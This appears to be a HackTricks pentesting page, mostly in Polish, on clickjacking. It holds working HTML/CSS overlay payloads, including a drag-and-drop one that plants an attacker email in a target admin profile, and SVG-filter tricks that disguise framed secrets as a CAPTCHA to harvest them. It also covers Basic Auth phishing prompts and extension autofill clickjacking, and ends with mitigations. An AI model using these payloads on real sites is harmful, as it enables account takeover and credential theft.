# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Czym jest Clickjacking

W ataku clickjacking **użytkownik** zostaje **oszukany**, aby **kliknął** w **element** na stronie internetowej, który jest albo **niewidoczny**, albo podszyty jako inny element. Ta manipulacja może prowadzić do niezamierzonych konsekwencji dla użytkownika, takich jak pobranie malware, przekierowanie na złośliwe strony, ujawnienie poświadczeń lub wrażliwych informacji, przelewy pieniędzy lub zakup produktów online.

### Sztuczka wstępnego wypełniania formularzy

Czasami możliwe jest **wypełnienie wartości pól formularza za pomocą parametrów GET podczas ładowania strony**. Atakujący może nadużyć tego zachowania, aby wypełnić formularz dowolnymi danymi i wysłać clickjacking payload, tak aby użytkownik nacisnął przycisk Submit.

### Wypełnianie formularza za pomocą Drag\&Drop

Jeśli potrzebujesz, aby użytkownik **wypełnił formularz**, ale nie chcesz prosić go bezpośrednio o wpisanie określonych informacji (np. e-maila lub konkretnego hasła, które znasz), możesz poprosić go, aby **Drag\&Drop** coś, co wpisze kontrolowane przez ciebie dane, jak w [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Wielokrokowy Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Jeśli zidentyfikowałeś **XSS attack that requires a user to click** w jakiś element, aby **trigger** XSS i strona jest **vulnerable to clickjacking**, możesz to wykorzystać, aby oszukać użytkownika, by kliknął przycisk/link.\  
Example:\  
Znalazłeś **self XSS** w prywatnych danych konta (dane, które **only you can set and read**). Strona z **form** do ustawiania tych danych jest **vulnerable** na **Clickjacking** i możesz **prepopulate** **form** za pomocą parametrów GET.\  
Atakujący mógłby przygotować atak **Clickjacking** na tę stronę, **prepopulating** **form** z **XSS payload** i **tricking** **user** aby **Submit** formularz. Tak więc, **when the form is submitted** i wartości zostaną zmienione, **user will execute the XSS**.


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), ta technika polega na poproszeniu ofiary o podwójne kliknięcie przycisku na niestandardowej stronie umieszczonej w konkretnym miejscu oraz wykorzystaniu różnic czasowych między zdarzeniami mousedown i onclick, aby załadować stronę ofiary podczas podwójnego kliknięcia, tak że **victim actually clicks a legit button in the victim page**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Ta technika pozwala oszukać użytkownika, by kliknął w jednym miejscu na stronie ofiary, omijając wszystkie zabezpieczenia przeciw clickjacking. Dlatego atakujący musi znaleźć **sensitive actions that can be done with just 1 click, like OAuth prompts accepting permissions**.

### SVG Filters / Cross-Origin Iframe UI Redressing

Wersje Chromium/WebKit/Gecko pozwalają na zastosowanie CSS `filter:url(#id)` do cross-origin iframes. Rastrowane piksele iframe są ujawniane grafowi filtrów SVG jako `SourceGraphic`, więc prymitywy takie jak `feDisplacementMap`, `feBlend`, `feComposite`, `feColorMatrix`, `feTile`, `feMorphology` itd. mogą dowolnie zniekształcić UI ofiary zanim użytkownik go zobaczy, mimo że atakujący nigdy nie dotyka DOM. Prosty filtr w stylu Liquid-Glass wygląda tak:
```html
<iframe src="https://victim.example" style="filter:url(#displacementFilter4)"></iframe>
```
* Przydatne prymitywy: `feImage` ładuje bitmapy atakującego (e.g., overlays, displacement maps); `feFlood` tworzy maty o stałym kolorze; `feOffset/feGaussianBlur` dopracowują podświetlenia; `feDisplacementMap` załamuje/zniekształca tekst; `feComposite operator="arithmetic"` realizuje dowolne obliczenia na kanałach (`r = k1*i1*i2 + k2*i1 + k3*i2 + k4`), co wystarcza do zwiększania kontrastu, maskowania oraz operacji AND/OR; `feTile` przycina i powiela próbki pikseli; `feMorphology` rozszerza/kurczy obrysy; `feColorMatrix` przenosi luminancję do kanału alfa, aby budować precyzyjne maski.

#### Zniekształcanie sekretów na wzór CAPTCHA

Jeśli punkt końcowy, który można osadzić w ramce, renderuje sekrety (tokens, reset codes, API keys), atakujący może je zniekształcić tak, aby przypominały CAPTCHA i wymusić ręczne przepisanie:
```html
<svg width="0" height="0">
<filter id="captchaFilter">
<feTurbulence type="turbulence" baseFrequency="0.03" numOctaves="4" result="noise" />
<feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
</filter>
</svg>
<iframe src="https://victim" style="filter:url(#captchaFilter)"></iframe>
<input pattern="^6c79 ?7261 ?706f ?6e79$" required>
```
Zniekształcone piksele oszukują użytkownika, by “rozwiązał” captcha wewnątrz kontrolowanego przez atakującego `<input>`, którego `pattern` wymusza prawdziwy sekret ofiary.

#### Rekontekstualizacja pól wejściowych ofiary

Filtry mogą chirurgicznie usuwać placeholder/validation text, jednocześnie zachowując naciśnięcia klawiszy użytkownika. Jeden workflow:

1. `feComposite operator="arithmetic" k2≈4` wzmacnia jasność, więc szary tekst pomocniczy nasyca się do bieli.
2. `feTile` ogranicza obszar roboczy do prostokąta pola.
3. `feMorphology operator="erode"` pogrubia ciemne glify wpisane przez ofiarę i zapisuje je przez `result="thick"`.
4. `feFlood` tworzy białą płytę, `feBlend mode="difference"` z `thick`, a drugi `feComposite k2≈100` zamienia to w wyraźną luma matte.
5. `feColorMatrix` przenosi tę luma do kanału alpha, a `feComposite in="SourceGraphic" operator="in"` zachowuje jedynie glify wpisane przez użytkownika.
6. Kolejny `feBlend in2="white"` plus cienkie przycięcie daje czyste pole tekstowe, po czym atakujący nakłada własne etykiety HTML (np. “Wpisz swój adres e-mail”), podczas gdy ukryty iframe nadal wymusza politykę haseł originu ofiary.

Safari ma problemy z `feTile`; ten sam efekt można odtworzyć za pomocą spatial mattes zbudowanych z `feFlood` + `feColorMatrix` + `feComposite` dla payloadów WebKit-only.

#### Sondy pikseli, logika i maszyny stanów

Przycinając region 2–4 px za pomocą `feTile` i kafelkując go na `100%` viewportu, atakujący przekształca próbnikowy kolor w teksturę obejmującą cały ekran, którą można progować do maski boolowskiej:
```html
<filter id="pixelProbe">
<feTile x="313" y="141" width="4" height="4" />
<feTile x="0" y="0" width="100%" height="100%" result="probe" />
<feComposite in="probe" operator="arithmetic" k2="120" k4="-1" />
<feColorMatrix type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 1 0 0" result="mask" />
<feGaussianBlur in="SourceGraphic" stdDeviation="2" />
<feComposite operator="in" in2="mask" />
<feBlend in2="SourceGraphic" />
</filter>
```
Dla dowolnych kolorów, odniesienie `feFlood` (np. `#0B57D0`) plus `feBlend mode="difference"` i kolejny arithmetic composite (`k2≈100`, `k4` jako tolerancja) daje biel tylko wtedy, gdy próbkowany piksel odpowiada docelowemu odcieniowi. Podawanie tych masek do `feComposite` z dostrojonymi `k1..k4` generuje bramki logiczne: `AND` przez `k1=1`, `OR` przez `k2=k3=1`, `XOR` przez `feBlend mode="difference"`, `NOT` przez blendowanie względem bieli. Łączenie bramek tworzy pełny sumator wewnątrz grafu filtrów, co dowodzi, że pipeline jest funkcjonalnie kompletny.

Atakujący mogą więc odczytywać stan UI bez JavaScript. Przykładowe wartości boolowskie z przebiegu modalnego okna:

- **D** (dialog visible): probe a darkened corner and test against white.
- **L** (dialog loaded): probe the coordinates where the button appears once ready.
- **C** (checkbox checked): compare the checkbox pixel against the active blue `#0B57D0`.
- **R** (red success/failure banner): use `feMorphology` and red thresholds inside the banner rectangle.

Każdy wykryty stan steruje inną nakładką bitmapową osadzoną przez `feImage xlink:href="data:..."`. Maskowanie tych bitmap za pomocą `D`, `L`, `C`, `R` utrzymuje nakładki zsynchronizowane z rzeczywistym dialogiem i prowadzi ofiarę przez wieloetapowe workflowy (resety haseł, approvals, destructive confirmations) bez konieczności ujawniania DOM.

### Iframe w sandboxie — Basic Auth dialog (no allow-popups)

Iframe w sandboxie bez `allow-popups` nadal może wyświetlić kontrolowane przez przeglądarkę **HTTP Basic Authentication modal**, gdy ładowanie zwróci `401` z `WWW-Authenticate`. Okno dialogowe jest tworzone przez warstwę sieciową/autoryzacyjną przeglądarki (nie przez JS `alert/prompt/confirm`), więc ograniczenia popupów w sandboxie **nie** tłumią tego. Jeśli możesz skryptować iframe (np. `sandbox="allow-scripts"`), możesz nawigować go do dowolnego endpointu wydającego wyzwanie Basic Auth:
```html
<iframe id="basic" sandbox="allow-scripts"></iframe>
<script>
basic.src = "https://httpbin.org/basic-auth/user/pass"
</script>
```
Gdy odpowiedź nadejdzie, przeglądarka wyświetla monit o dane uwierzytelniające, mimo że popupy są zabronione. Framing zaufanego origin za pomocą tego triku umożliwia UI redress/phishing: nieoczekiwane modalne monity wewnątrz "sandboxed" widgetu mogą zmylić użytkowników lub spowodować, że Password managers zaoferują zapisane poświadczenia.

### Browser extensions: DOM-based autofill clickjacking

Poza iframingiem stron ofiar, atakujący mogą celować w elementy UI rozszerzeń przeglądarki, które są wstrzykiwane na stronę. Password managers renderują autofill dropdowns w pobliżu fokusowanych inputów; poprzez ustawienie fokusu na polu kontrolowanym przez atakującego i ukrycie/zasłonięcie dropdownu rozszerzenia (triki z opacity/overlay/top-layer), wymuszony klik użytkownika może wybrać zapisany element i wypełnić wrażliwe dane do pól kontrolowanych przez atakującego. Ta wariant nie wymaga ekspozycji iframe i działa całkowicie poprzez DOM/CSS manipulacje.

- For concrete techniques and PoCs see:
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategie łagodzenia Clickjacking

### Obrona po stronie klienta

Skrypty wykonywane po stronie klienta mogą podejmować działania zapobiegające Clickjackingowi:

- Upewnianie się, że okno aplikacji jest głównym lub najwyższym oknem.
- Uczynienie wszystkich ramek widocznymi.
- Zapobieganie kliknięciom w niewidoczne ramki.
- Wykrywanie i ostrzeganie użytkowników o potencjalnych próbach Clickjackingu.

Jednak można obejść te skrypty typu frame-busting:

- **Ustawienia bezpieczeństwa przeglądarek:** Niektóre przeglądarki mogą blokować te skrypty w zależności od ustawień bezpieczeństwa lub braku wsparcia dla JavaScriptu.
- **HTML5 iframe `sandbox` Attribute:** Atakujący może zneutralizować frame buster scripts przez ustawienie atrybutu `sandbox` z wartościami `allow-forms` lub `allow-scripts` bez `allow-top-navigation`. To uniemożliwia iframe sprawdzenie, czy jest oknem nadrzędnym, np.,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
The `allow-forms` and `allow-scripts` values enable actions within the iframe while disabling top-level navigation. To ensure the intended functionality of the targeted site, additional permissions like `allow-same-origin` and `allow-modals` might be necessary, depending on the attack type. Browser console messages can guide which permissions to allow.

### Środki obronne po stronie serwera

#### X-Frame-Options

**nagłówek odpowiedzi HTTP `X-Frame-Options`** informuje przeglądarki o prawidłowości renderowania strony w `<frame>` lub `<iframe>`, pomagając zapobiegać Clickjackingowi:

- `X-Frame-Options: deny` - Żadna domena nie może osadzać zawartości.
- `X-Frame-Options: sameorigin` - Tylko bieżąca witryna może osadzać zawartość.
- `X-Frame-Options: allow-from https://trusted.com` - Tylko wskazane 'uri' może osadzać stronę.
- Uwaga na ograniczenia: jeśli przeglądarka nie obsługuje tej dyrektywy, może ona nie działać. Niektóre przeglądarki preferują dyrektywę CSP `frame-ancestors`.

#### Dyrektywa frame-ancestors w Content Security Policy (CSP)

**Dyrektywa `frame-ancestors` w CSP** jest zalecaną metodą ochrony przed Clickjackingiem:

- `frame-ancestors 'none'` - Podobne do `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - Podobne do `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - Podobne do `X-Frame-Options: allow-from`.

Na przykład następująca CSP pozwala na osadzanie tylko z tej samej domeny:

`Content-Security-Policy: frame-ancestors 'self';`

Further details and complex examples can be found in the [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) and [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) z `child-src` i `frame-src`

**Content Security Policy (CSP)** to mechanizm bezpieczeństwa, który pomaga zapobiegać Clickjackingowi i innym atakom polegającym na wstrzyknięciu kodu, określając źródła, z których przeglądarka może ładować treści.

#### Dyrektywa `frame-src`

- Określa prawidłowe źródła dla ramek.
- Bardziej szczegółowa niż dyrektywa `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ta polityka pozwala na ramki z tej samej domeny (self) oraz z https://trusted-website.com.

#### `child-src` Dyrektywa

- Wprowadzona w CSP poziomu 2, aby określić dozwolone źródła dla web workers i ramek.
- Pełni funkcję zapasową dla frame-src i worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Ta polityka pozwala na frames i workers z tej samej domeny (self) oraz https://trusted-website.com.

**Uwagi dotyczące użycia:**

- Wycofywanie: child-src jest stopniowo wycofywany na rzecz frame-src i worker-src.
- Zachowanie zapasowe: Jeśli frame-src jest nieobecny, child-src jest używany jako fallback dla frames. Jeśli oba są nieobecne, używany jest default-src.
- Ścisłe definiowanie źródeł: Uwzględniaj tylko zaufane źródła w dyrektywach, aby zapobiec wykorzystaniu.

#### JavaScript Frame-Breaking Scripts

Chociaż nie są całkowicie niezawodne, skrypty JavaScript-based frame-busting mogą być użyte, aby zapobiec osadzeniu strony w ramce. Przykład:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Zastosowanie Anti-CSRF Tokens

- **Weryfikacja tokenów:** Używaj anti-CSRF tokens w aplikacjach webowych, aby zapewnić, że żądania zmieniające stan są wykonywane celowo przez użytkownika, a nie przez Clickjacked page.

## Źródła

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [SVG Filters - Clickjacking 2.0](https://lyra.horse/blog/2025/12/svg-clickjacking/)
- [Iframe sandbox Basic Auth modal](https://phor3nsic.github.io/2026/01/21/trick-iframe-sandbox.html)
- [Chromestatus: Restrict sandboxed frame dialogs](https://chromestatus.com/feature/4747009953103872)
- [Chromium issue about sandboxed auth dialogs](https://issues.chromium.org/issues/40266321)

{{#include ../banners/hacktricks-training.md}}
